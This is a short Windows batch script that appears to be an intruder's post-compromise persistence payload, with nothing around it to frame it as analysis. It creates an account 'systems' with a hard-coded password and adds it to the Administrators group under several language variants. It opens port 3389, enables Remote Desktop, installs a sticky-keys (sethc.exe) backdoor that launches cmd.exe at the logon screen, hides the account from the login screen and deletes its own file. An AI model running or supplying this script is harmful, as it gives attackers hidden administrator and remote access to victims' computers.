net user systems P@ssword1@ /add
net user systems P@ssword1@
net localgroup Administrators systems /add
net localgroup Administratores systems /add
net localgroup Administradores systems /add
net localgroup Administratöres systems /add
net localgroup Administrateurs systems /add
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList" /v systems /t REG_DWORD /d 0
del c:\windows\system32\1.bat



